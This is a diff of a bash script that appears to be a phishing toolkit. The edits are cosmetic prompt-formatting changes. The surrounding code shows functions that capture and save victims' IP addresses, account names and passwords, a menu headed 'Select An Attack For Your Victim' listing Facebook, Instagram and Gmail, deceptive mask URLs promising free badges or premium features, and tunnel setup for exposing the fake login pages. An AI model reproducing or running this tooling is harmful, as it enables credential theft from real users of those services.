@@ -151,7 +151,7 @@ check_update() {
   [ -n "$__version__" ] || { echo "[!] __version__ not set"; return 1; }
   [ -n "$BASE_DIR" ] || { echo "[!] BASE_DIR not set"; return 1; }
 
-  echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+  echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update: "
 
   # Prefer jq if available, otherwise fallback to grep/awk
   if command -v jq >/dev/null 2>&1; then
@@ -210,7 +210,7 @@ check_update() {
 
 ## Check Internet Status
 check_status() {
-	echo -ne "\n${ORANGE}[${BLUE}+${ORANGE}]${CYAN} Internet Status : "
+	echo -ne "\n${ORANGE}[${BLUE}+${ORANGE}]${CYAN} Internet Status: "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
@@ -221,12 +221,12 @@ dependencies() {
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
@@ -237,7 +237,7 @@ dependencies() {
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -348,7 +348,7 @@ about() {
 		${WHITE}00. Main Menu     ${WHITE}99. Exit
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${BRIGHT_GREEN} Select an option : ${BLUE}"
+	read -p "${WHITE}Select an option:"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -364,15 +364,15 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
 		else
-			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port: $CU_P, Try Again...${WHITE}"
 			{ sleep 2; clear; banner_small; cusport; }
 		fi		
 	else 
@@ -393,8 +393,8 @@ setup_site() {
 capture_ip() {
     victim_ip=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
     IFS=$'\n'
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$victim_ip"
-    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP: ${BLUE}$victim_ip"
+    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/ip.txt"
     cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -412,10 +412,10 @@ capture_creds() {
     
     IFS=$'\n'
     # Print info to console
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP : ${BLUE}$victim_ip"
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP: ${BLUE}$victim_ip"
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account: ${BLUE}$ACCOUNT"
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password: ${BLUE}$PASSWORD"
+    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/usernames.dat"
     
     # Save IP and credentials to file
     echo "Victim IP: $victim_ip" >> auth/usernames.dat
@@ -472,7 +472,7 @@ localxpose_auth() {
 	[ "$(./.server/loclx account status | grep Error)" ] && {
 		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token:${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
 		} || {
@@ -509,7 +509,7 @@ start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at: ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
@@ -524,7 +524,7 @@ tunnel_menu() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service or return to main menu : ${BLUE}"
+	read -p "${WHITE} Select a port forwarding service or return to main menu:"
 
 	case $REPLY in 
 		0 | 00)
@@ -550,7 +550,7 @@ custom_mask() {
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url:${GREEN} $mask"
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
 		fi
@@ -611,7 +611,7 @@ site_facebook() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${WHITE}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
@@ -631,7 +631,7 @@ site_facebook() {
 			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -647,7 +647,7 @@ site_instagram() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${WHITE}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
@@ -667,7 +667,7 @@ site_instagram() {
 			mask='https://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
@@ -682,7 +682,7 @@ site_gmail() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${WHITE}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
@@ -698,7 +698,7 @@ site_gmail() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -707,7 +707,7 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${WHITE}Select An Attack For Your Victim
+		${RED}Select An Attack For Your Victim
 
 		${WHITE}1. Facebook		${WHITE}10. Spotify
 		${WHITE}2. Instagram		${WHITE}11. Github
@@ -792,7 +792,7 @@ main_menu() {
 		0 | 00 )
 			msg_exit;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
 	
 	esac
